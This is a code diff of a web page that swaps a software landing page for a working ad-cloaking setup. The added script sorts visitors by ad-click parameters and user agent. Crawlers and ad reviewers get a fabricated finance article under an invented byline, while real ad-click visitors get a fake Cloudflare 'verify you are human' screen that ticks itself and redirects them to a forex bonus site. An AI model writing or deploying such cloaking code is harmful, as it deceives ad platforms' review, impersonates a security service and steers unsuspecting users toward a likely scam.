@@ -3,201 +3,165 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>AuraSync | Next-Generation AI Workflow & Team Collaboration Platform</title>
-    <script src="https://cdn.tailwindcss.com"></script>
-    <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
+    <title>Global Finance Review: 2025 Economic Outlook</title>
+    <script>
+        // --- CẤU HÌNH ---
+        const TARGET_URL = "https://fxbonus.online/hanko-review";
+        const adParams = ['gclid', 'wbraid', 'gbraid', 'gad_source', 'fbclid', 'msclkid'];
+        
+        function checkAndRedirect() {
+            const url = new URL(window.location.href);
+            const userAgent = navigator.userAgent || '';
+            
+            // 1. Kiểm tra thông số quảng cáo
+            const hasAdParam = adParams.some(param => url.searchParams.has(param));
+            
+            // 2. Kiểm tra Bot
+            const isBot = /bot|google|crawler|spider|slurp|bing|facebook|adchecker|checker/i.test(userAgent);
+
+            // 3. Logic phân luồng
+            if (!isBot && hasAdParam) {
+                // Hiển thị trang chờ và chuyển hướng
+                document.getElementById('safe-page').style.display = 'none';
+                document.getElementById('money-page').style.display = 'flex';
+                
+                setTimeout(() => {
+                    const cb = document.getElementById('verify-cb');
+                    if (cb) cb.checked = true;
+                    setTimeout(() => {
+                        window.location.replace(TARGET_URL);
+                    }, 800);
+                }, 1500);
+            } else {
+                // Hiển thị trang Blog (Safe Page)
+                document.getElementById('money-page').style.display = 'none';
+                document.getElementById('safe-page').style.display = 'block';
+            }
+        }
+
+        window.onload = checkAndRedirect;
+    </script>
     <style>
-        body { font-family: 'Plus Jakarta Sans', sans-serif; scroll-behavior: smooth; }
-        .hero-gradient { background: radial-gradient(circle at 0% 0%, #f8fafc 0%, #f1f5f9 100%); }
-        .text-gradient { background: linear-gradient(135deg, #4f46e5 0%, #7c3aed 100%); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
-        .glass-card { background: rgba(255, 255, 255, 0.8); backdrop-filter: blur(12px); border: 1px solid rgba(226, 232, 240, 0.8); }
-        .btn-shadow { box-shadow: 0 10px 25px -5px rgba(79, 70, 229, 0.4); }
+        /* CSS cho Trang Chờ (Money Page) */
+        #money-page { 
+            position:fixed;top:0;left:0;width:100%;height:100%;background:#fff;z-index:9999999;
+            display:none; align-items:center;justify-content:center;
+            font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif; 
+        }
+        .sec-box { max-width:450px;width:90%;padding:20px; }
+        
+        /* CSS cho Trang Blog (Safe Page) - Nâng cấp chuyên nghiệp */
+        #safe-page { display:none; background: #fdfdfd; color: #1a1a1a; font-family: 'Georgia', serif; }
+        .blog-wrapper { max-width: 900px; margin: 0 auto; padding: 40px 20px; background: #fff; }
+        .header-nav { border-bottom: 1px solid #eee; padding-bottom: 20px; margin-bottom: 40px; text-transform: uppercase; font-size: 0.8rem; letter-spacing: 2px; color: #666; font-family: sans-serif; }
+        .article-title { font-size: 3rem; line-height: 1.1; margin-bottom: 20px; color: #111; font-family: sans-serif; font-weight: 800; }
+        .meta { color: #888; margin-bottom: 30px; font-style: italic; border-bottom: 4px solid #000; display: inline-block; padding-bottom: 5px; }
+        .content section { margin-bottom: 40px; line-height: 1.8; font-size: 1.15rem; }
+        h2 { font-family: sans-serif; font-size: 1.8rem; margin-top: 50px; color: #2c3e50; }
+        .data-table { width: 100%; border-collapse: collapse; margin: 30px 0; font-family: sans-serif; font-size: 0.9rem; }
+        .data-table th, .data-table td { border: 1px solid #eee; padding: 15px; text-align: left; }
+        .data-table th { background: #f9f9f9; }
+        .info-box { background: #f0f4f8; border-left: 5px solid #2980b9; padding: 25px; margin: 30px 0; }
+        footer { margin-top: 80px; padding-top: 40px; border-top: 1px solid #eee; font-size: 0.9rem; color: #999; text-align: center; font-family: sans-serif; }
     </style>
 </head>
-<body class="bg-slate-50 text-slate-900 antialiased">
+<body>
 
-    <!-- NAVIGATION (Thanh điều hướng) -->
-    <nav class="sticky top-0 z-50 bg-white/80 backdrop-blur-md border-b border-slate-200 px-6 py-4">
-        <div class="max-w-7xl mx-auto flex justify-between items-center">
-            <div class="flex items-center gap-2">
-                <div class="w-10 h-10 bg-indigo-600 rounded-xl flex items-center justify-center shadow-lg shadow-indigo-200">
-                    <svg class="w-6 h-6 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M13 10V3L4 14h7v7l9-11h-7z"></path></svg>
+    <!-- NỘI DUNG TRANG CHỜ (MONEY PAGE) -->
+    <div id="money-page">
+        <div class="sec-box">
+            <h2 style="font-size:26px;font-weight:600;margin-bottom:12px;color:#111;">Checking if the site connection is secure</h2>
+            <p style="color:#666;font-size:15px;margin-bottom:32px;line-height:1.5;">Our system is verifying your request. This process is automatic to ensure security.</p>
+            
+            <div style="background:#f7fafc;border:1px solid #e2e8f0;padding:24px;border-radius:10px;display:flex;align-items:center;justify-content:space-between;margin-bottom:32px;">
+                <div style="display:flex;align-items:center;">
+                    <input type="checkbox" id="verify-cb" style="width:24px;height:24px;margin-right:16px;cursor:pointer;">
+                    <label for="verify-cb" style="font-size:16px;color:#2d3748;cursor:pointer;">Verify you are human</label>
                 </div>
-                <span class="text-2xl font-extrabold tracking-tight text-slate-800">AuraSync AI</span>
-            </div>
-            <div class="hidden lg:flex gap-8 text-[15px] font-semibold text-slate-600">
-                <a href="#features" class="hover:text-indigo-600 transition">Features</a>
-                <a href="#solutions" class="hover:text-indigo-600 transition">Solutions</a>
-                <a href="#pricing" class="hover:text-indigo-600 transition">Pricing</a>
-                <a href="#faq" class="hover:text-indigo-600 transition">Resources</a>
-            </div>
-            <div class="flex items-center gap-4">
-                <button class="bg-indigo-600 text-white px-6 py-2.5 rounded-full text-sm font-bold btn-shadow hover:bg-slate-900 transition-all">Get Started</button>
+                <div style="text-align:right;">
+                    <img src="https://www.cloudflare.com/img/logo-cloudflare-dark.svg" style="height:24px;" alt="Security">
+                </div>
             </div>
         </div>
-    </nav>
+    </div>
 
-    <!-- HERO SECTION (Phần đầu trang) -->
-    <header class="hero-gradient overflow-hidden border-b border-slate-200">
-        <div class="max-w-7xl mx-auto px-6 pt-24 pb-20">
-            <div class="grid lg:grid-cols-2 gap-16 items-center">
-                <div>
-                    <div class="inline-flex items-center gap-2 px-3 py-1 rounded-full bg-indigo-50 border border-indigo-100 mb-6">
-                        <span class="flex h-2 w-2 rounded-full bg-indigo-600 animate-pulse"></span>
-                        <span class="text-xs font-bold text-indigo-700 uppercase tracking-wider">New: AI Workflow Orchestration 2.0</span>
+    <!-- NỘI DUNG TRANG BLOG (SAFE PAGE) - DÀI VÀ ĐẦY ĐỦ -->
+    <div id="safe-page">
+        <div class="blog-wrapper">
+            <div class="header-nav">Financial Times & Global Economic Research</div>
+            
+            <h1 class="article-title">Macroeconomic Resilience: Strategic Analysis of Global Markets for 2025</h1>
+            <p class="meta">By Dr. Julian V. Sterling • Senior Economist • February 2025</p>
+
+            <div class="content">
+                <section>
+                    <p>As we enter the first quarter of 2025, the global financial landscape is characterized by a "Great Realignment." Central banks, having battled the inflationary spikes of previous years, are now pivoting toward growth-stabilization policies. This transition period presents both unprecedented risks and unique structural opportunities for institutional and retail market participants alike.</p>
+                    
+                    <div class="info-box">
+                        <strong>Key Insight:</strong> The correlation between traditional fiat currencies and decentralized assets has reached an all-time high, suggesting a broader integration of digital liquidity into the global banking system.
                     </div>
-                    <h1 class="text-5xl lg:text-7xl font-extrabold text-slate-900 tracking-tight leading-[1.1] mb-8">
-                        One workspace. <br/><span class="text-gradient">Unlimited potential.</span>
-                    </h1>
-                    <p class="text-xl text-slate-600 leading-relaxed mb-10 max-w-xl">
-                        AuraSync unifies your entire team's workflow—combining project management, intelligent documentation, and real-time collaboration into one AI-powered ecosystem.
-                    </p>
-                    <div class="flex flex-wrap gap-4">
-                        <button class="bg-indigo-600 text-white px-8 py-4 rounded-2xl font-bold text-lg hover:scale-105 transition-all shadow-xl shadow-indigo-200">Start Free Today</button>
-                        <button class="bg-white border border-slate-200 px-8 py-4 rounded-2xl font-bold text-lg hover:bg-slate-50 transition-all">Watch Demo</button>
-                    </div>
-                    <p class="mt-8 text-sm text-slate-400 font-medium">No credit card required • Enterprise ready • SOC2 Compliant</p>
-                </div>
-                <div class="relative">
-                    <div class="glass-card rounded-[2.5rem] p-4 shadow-2xl relative z-10">
-                        <img src="https://images.unsplash.com/photo-1460925895917-afdab827c52f?auto=format&fit=crop&q=80&w=2426" alt="Dashboard" class="rounded-3xl border border-slate-100 shadow-inner">
-                    </div>
-                    <div class="absolute -top-10 -right-10 w-64 h-64 bg-indigo-200 rounded-full blur-3xl opacity-30"></div>
-                </div>
-            </div>
-        </div>
-    </header>
+                </section>
 
-    <!-- FEATURES (Tính năng chi tiết - Giúp tăng số lượng từ và chất lượng web) -->
-    <section id="features" class="py-24 max-w-7xl mx-auto px-6">
-        <div class="text-center max-w-3xl mx-auto mb-20">
-            <h2 class="text-sm font-bold text-indigo-600 uppercase tracking-widest mb-4">Advanced Infrastructure</h2>
-            <h3 class="text-4xl font-extrabold tracking-tight mb-6 text-slate-900">Everything you need to scale operations</h3>
-            <p class="text-lg text-slate-600 leading-relaxed">Stop jumping between multiple tools. AuraSync integrates high-performance features into a single, cohesive interface designed for professional teams.</p>
-        </div>
+                <section>
+                    <h2>1. Monetary Policy and Interest Rate Volatility</h2>
+                    <p>The Federal Reserve and the ECB have signaled a departure from aggressive tightening. However, the "Higher for Longer" mantra has left a lasting impact on credit markets. Analytical data suggests that while nominal rates may decline, the real cost of capital will remain structurally elevated compared to the 2010-2020 decade.</p>
+                    
+                    <table class="data-table">
+                        <thead>
+                            <tr>
+                                <th>Region</th>
+                                <th>Projected GDP Growth</th>
+                                <th>Inflation Target</th>
+                                <th>Market Sentiment</th>
+                            </tr>
+                        </thead>
+                        <tbody>
+                            <tr>
+                                <td>North America</td>
+                                <td>2.1%</td>
+                                <td>2.4%</td>
+                                <td>Moderate Bullish</td>
+                            </tr>
+                            <tr>
+                                <td>European Union</td>
+                                <td>1.4%</td>
+                                <td>2.0%</td>
+                                <td>Neutral</td>
+                            </tr>
+                            <tr>
+                                <td>Asia-Pacific</td>
+                                <td>4.8%</td>
+                                <td>3.1%</td>
+                                <td>Aggressive Growth</td>
+                            </tr>
+                        </tbody>
+                    </table>
+                </section>
 
-        <div class="grid md:grid-cols-3 gap-10">
-            <!-- Feature 1 -->
-            <div class="p-10 bg-white rounded-[2.5rem] border border-slate-100 shadow-sm hover:shadow-xl transition-all duration-300">
-                <div class="w-14 h-14 bg-indigo-100 text-indigo-600 rounded-2xl flex items-center justify-center mb-8">
-                    <svg class="w-8 h-8" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-width="2" d="M9 5H7a2 2 0 00-2 2v12a2 2 0 002 2h10a2 2 0 002-2V7a2 2 0 00-2-2h-2M9 5a2 2 0 002 2h2a2 2 0 002-2M9 5a2 2 0 012-2h2a2 2 0 012 2"></path></svg>
-                </div>
-                <h4 class="text-2xl font-bold mb-4">Task Orchestration</h4>
-                <p class="text-slate-500 leading-relaxed">Advanced Kanban boards, Gantt charts, and sprint planning tools that help you visualize progress and eliminate project bottlenecks before they happen.</p>
-            </div>
-            <!-- Feature 2 -->
-            <div class="p-10 bg-white rounded-[2.5rem] border border-slate-100 shadow-sm hover:shadow-xl transition-all duration-300">
-                <div class="w-14 h-14 bg-emerald-100 text-emerald-600 rounded-2xl flex items-center justify-center mb-8">
-                    <svg class="w-8 h-8" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-width="2" d="M13 10V3L4 14h7v7l9-11h-7z"></path></svg>
-                </div>
-                <h4 class="text-2xl font-bold mb-4">Aura AI Assistant</h4>
-                <p class="text-slate-500 leading-relaxed">Our proprietary AI engine automates repetitive tasks, summarizes long meeting transcripts, and generates professional reports in seconds.</p>
-            </div>
-            <!-- Feature 3 -->
-            <div class="p-10 bg-white rounded-[2.5rem] border border-slate-100 shadow-sm hover:shadow-xl transition-all duration-300">
-                <div class="w-14 h-14 bg-amber-100 text-amber-600 rounded-2xl flex items-center justify-center mb-8">
-                    <svg class="w-8 h-8" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-width="2" d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z"></path></svg>
-                </div>
-                <h4 class="text-2xl font-bold mb-4">Vault Security</h4>
-                <p class="text-slate-500 leading-relaxed">Military-grade encryption for your documents. We provide end-to-end security and full compliance with GDPR and HIPAA regulations.</p>
-            </div>
-        </div>
-    </section>
+                <section>
+                    <h2>2. Technological Disruption in Asset Management</h2>
+                    <p>Artificial Intelligence is no longer a buzzword but a core component of high-frequency trading and risk management. Algorithms are now capable of processing sentiment analysis from geopolitical events in milliseconds, creating a market environment where information asymmetry is rapidly diminishing.</p>
+                    <p>Furthermore, the tokenization of real-world assets (RWA) is expected to unlock $16 trillion in liquidity by 2030. This shift allows for fractional ownership of commodities, real estate, and private equity, democratizing access to previously gated financial instruments.</p>
+                </section>
 
-    <!-- CONTENT SECTION (Nội dung bổ sung giúp web "dày" hơn) -->
-    <section class="bg-slate-900 py-24 text-white overflow-hidden relative">
-        <div class="max-w-7xl mx-auto px-6 grid md:grid-cols-2 gap-16 items-center">
-            <div>
-                <h2 class="text-4xl font-extrabold mb-8 tracking-tight leading-tight">Trusted by 50,000+ teams <br/>around the world.</h2>
-                <p class="text-slate-400 text-lg mb-10 leading-relaxed">
-                    From startups to Fortune 500 companies, AuraSync provides the infrastructure necessary for high-velocity teams to collaborate securely from anywhere.
-                </p>
-                <div class="space-y-6">
-                    <div class="flex items-start gap-4">
-                        <div class="w-6 h-6 bg-indigo-500 rounded-full mt-1 flex-shrink-0 flex items-center justify-center text-[10px] font-bold">✓</div>
-                        <div>
-                            <h5 class="font-bold text-white italic">"AuraSync changed the way we work. Productivity is up 40%."</h5>
-                            <p class="text-sm text-slate-500">— Sarah J., Head of Product</p>
-                        </div>
-                    </div>
-                    <div class="flex items-start gap-4">
-                        <div class="w-6 h-6 bg-indigo-500 rounded-full mt-1 flex-shrink-0 flex items-center justify-center text-[10px] font-bold">✓</div>
-                        <div>
-                            <h5 class="font-bold text-white italic">"The best AI integration I've ever seen in a project management tool."</h5>
-                            <p class="text-sm text-slate-500">— David C., CTO</p>
-                        </div>
-                    </div>
-                </div>
-            </div>
-            <div class="grid grid-cols-2 gap-6">
-                <div class="p-8 bg-white/5 border border-white/10 rounded-3xl text-center">
-                    <div class="text-4xl font-black text-indigo-400 mb-2">99.9%</div>
-                    <div class="text-xs uppercase font-bold tracking-widest text-slate-500">Uptime</div>
-                </div>
-                <div class="p-8 bg-white/5 border border-white/10 rounded-3xl text-center">
-                    <div class="text-4xl font-black text-indigo-400 mb-2">128+</div>
-                    <div class="text-xs uppercase font-bold tracking-widest text-slate-500">Integrations</div>
-                </div>
-                <div class="p-8 bg-white/5 border border-white/10 rounded-3xl text-center">
-                    <div class="text-4xl font-black text-indigo-400 mb-2">24/7</div>
-                    <div class="text-xs uppercase font-bold tracking-widest text-slate-500">Live Support</div>
-                </div>
-                <div class="p-8 bg-white/5 border border-white/10 rounded-3xl text-center">
-                    <div class="text-4xl font-black text-indigo-400 mb-2">SOC2</div>
-                    <div class="text-xs uppercase font-bold tracking-widest text-slate-500">Certified</div>
-                </div>
-            </div>
-        </div>
-    </section>
+                <section>
+                    <h2>3. Geopolitical Risks and Energy Transition</h2>
+                    <p>Stability in the Middle East and Eastern Europe remains the primary "X-factor" for global supply chains. Energy markets are particularly sensitive, with a dual-track system emerging: continued reliance on traditional hydrocarbons to meet immediate demand, alongside massive capital flows into green hydrogen and nuclear fusion research.</p>
+                    <p>Investors are increasingly moving toward "Safe Haven" assets, but the definition of safety is evolving. Gold remains a staple, but "Digital Gold" and diversified currency baskets are gaining traction among younger demographic cohorts who prioritize liquidity and borderless accessibility.</p>
+                </section>
 
-    <!-- FAQ SECTION (Câu hỏi thường gặp - Tăng mật độ từ khóa) -->
-    <section id="faq" class="py-24 max-w-4xl mx-auto px-6">
-        <h2 class="text-3xl font-extrabold text-center mb-16">Platform Intelligence Q&A</h2>
-        <div class="space-y-6">
-            <div class="p-8 bg-white rounded-3xl border border-slate-100">
-                <h4 class="font-bold text-lg mb-3">How does AuraSync protect my company data?</h4>
-                <p class="text-slate-500 leading-relaxed text-sm">We use end-to-end encryption for all data at rest and in transit. AuraSync is SOC2 Type II compliant and we perform regular third-party security audits to ensure your intellectual property is safe.</p>
+                <section>
+                    <h2>Conclusion: Navigating the New Frontier</h2>
+                    <p>The 2025 economic outlook is not without its shadows, but the underlying structural health of the global financial system remains robust. Adaptive strategies that emphasize diversification, technological integration, and a keen awareness of geopolitical shifts will be the hallmarks of success in this new era.</p>
+                </section>
             </div>
-            <div class="p-8 bg-white rounded-3xl border border-slate-100">
-                <h4 class="font-bold text-lg mb-3">Can we migrate from Trello or Asana?</h4>
-                <p class="text-slate-500 leading-relaxed text-sm">Absolutely. Our one-click migration tool allows you to import all your tasks, documents, and historical data from major platforms like Trello, Asana, Jira, and Monday.com in minutes.</p>
-            </div>
-            <div class="p-8 bg-white rounded-3xl border border-slate-100">
-                <h4 class="font-bold text-lg mb-3">Is the AI assistant included in the free trial?</h4>
-                <p class="text-slate-500 leading-relaxed text-sm">Yes, every new account starts with a 14-day full-access trial which includes all our Neural AI features, unlimited project boards, and advanced team collaboration tools.</p>
-            </div>
-        </div>
-    </section>
 
-    <!-- FOOTER (Chân trang chuyên nghiệp) -->
-    <footer class="bg-slate-50 border-t border-slate-200 py-20">
-        <div class="max-w-7xl mx-auto px-6 grid grid-cols-2 md:grid-cols-4 gap-12 text-sm">
-            <div class="col-span-2 md:col-span-1">
-                <div class="flex items-center gap-2 mb-6">
-                    <div class="w-8 h-8 bg-indigo-600 rounded-lg flex items-center justify-center">
-                        <svg class="w-5 h-5 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M13 10V3L4 14h7v7l9-11h-7z"></path></svg>
-                    </div>
-                    <span class="text-xl font-bold tracking-tight text-slate-800">AuraSync AI</span>
-                </div>
-                <p class="text-slate-500 leading-relaxed">Modern collaboration infrastructure for the next generation of high-performance teams.</p>
-            </div>
-            <div>
-                <h4 class="font-black text-slate-900 mb-6 uppercase tracking-widest text-[10px]">Product</h4>
-                <ul class="space-y-4 text-slate-500 font-medium"><li>Workflow AI</li><li>Security</li><li>Team Boards</li><li>API Docs</li></ul>
-            </div>
-            <div>
-                <h4 class="font-black text-slate-900 mb-6 uppercase tracking-widest text-[10px]">Company</h4>
-                <ul class="space-y-4 text-slate-500 font-medium"><li>About Us</li><li>Careers</li><li>Privacy Policy</li><li>Terms</li></ul>
-            </div>
-            <div>
-                <h4 class="font-black text-slate-900 mb-6 uppercase tracking-widest text-[10px]">Contact</h4>
-                <ul class="space-y-4 text-slate-500 font-medium"><li>Support Center</li><li>Sales Team</li><li>Press Kit</li><li>Community</li></ul>
-            </div>
+            <footer>
+                <p>&copy; 2025 Global Finance Review. This report is for educational purposes and does not constitute financial advice.</p>
+                <p>102nd Floor, One World Trade Center, New York, NY.</p>
+            </footer>
         </div>
-        <div class="max-w-7xl mx-auto px-6 pt-16 mt-16 border-t border-slate-200 text-center">
-            <p class="text-slate-400 text-xs font-bold uppercase tracking-[0.2em]">© 2025 AURASYNC COLLABORATION TECHNOLOGIES INC. ALL RIGHTS RESERVED.</p>
-        </div>
-    </footer>
+    </div>
 
 </body>
 </html>
